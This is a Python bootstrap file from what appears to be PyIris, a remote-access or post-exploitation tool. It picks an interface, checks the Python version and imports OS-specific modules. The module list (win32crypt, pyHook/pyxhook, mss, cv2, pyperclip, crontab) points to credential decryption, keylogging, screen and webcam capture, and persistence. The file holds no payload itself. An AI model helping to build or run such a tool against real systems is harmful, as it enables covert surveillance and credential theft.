# Bootstrap: interface is set here
# done
import library.modules.config as config

config.main()

windows_modules = ['pyperclip', 'win32crypt', 'cv2', 'pythoncom', 'mss', 'PIL', 'pyautogui', 'colorama',
                   'cryptography', 'pyHook', 'pycaw', 'readline']
linux_modules = ['cv2', 'mss', 'PIL', 'Xlib', 'pyautogui', 'pyperclip', 'pyxhook', 'crontab', 'cryptography',
                 'readline', 'alsaaudio']


def main():
    try:
        import sys
        import time
        import os
        os.system("")
        if os.name == 'nt':
            pass
            import colorama
            colorama.init(convert=True)
        print(config.inf + 'Starting...')  # first initial print statement that sets all colors of input to blue for cmder , some kind of encoding error in its console....
        try:
            interface = config.interface
        except:
            interface = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                                               '\x1b[1m\x1b[31mlibrary/modules/bootstrap\x1b[0m' +
                                               '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Graphical Interface / Command Interface [G/\x1b[4m\x1b[1mC\x1b[0m]\x1b[0m : ')
            if interface == "g" or interface == "G":
                config.interface = "GUI"
            else:
                config.interface = "CUI"
            interface = config.interface
        print(config.inf + "Interface set to " + interface)
        if sys.version_info[0] == 2:
            print (config.neg + 'PyIris is no longer deemed compatible with python 2 please use python 3')
            os._exit(1)
        print(config.pos + 'Using Python Version ' + str(sys.version_info[0]) + ' - OK')
        import platform
        import library.modules.keygen as keygen
        print(config.pos + 'All local files imported - OK')
        if platform.uname()[0] == 'Windows':
            print(config.pos + 'OS Windows - OK')
            for i in windows_modules:
                exec('import ' + i)
                print(config.pos + 'Successfully imported : ' + i + ' - OK')
            print(config.pos + 'Third party imports - OK')
            keygen.main('system_initiated')
        elif platform.uname()[0] == 'Linux':
            print(config.pos + 'OS Linux - OK')
            for i in linux_modules:
                exec('import ' + i)
                print(config.pos + 'Successfully imported : ' + i + ' - OK')
            keygen.main('system_initiated')
        else:
            print(config.neg + 'OS ' + platform.uname()[0] + ' - Error, Not Supported')
            return False
        return True
    except EOFError:
        try:
            time.sleep(2)
        except KeyboardInterrupt:
            print('\n' + config.war + 'User aborted bootstrap, requesting shutdown...')
            quit()
    except KeyboardInterrupt:
        print('\n' + config.war + 'User aborted bootstrap, requesting shutdown...')
        quit()
    except ImportError as e:
        print('[-]Could not import : ' + str(
            e) + ' - Error, missing packages or packages not installed from setup folder')
        return False
    except Exception as e:
        print(config.war + 'Unexpected error when bootstrapping : ' + str(e))
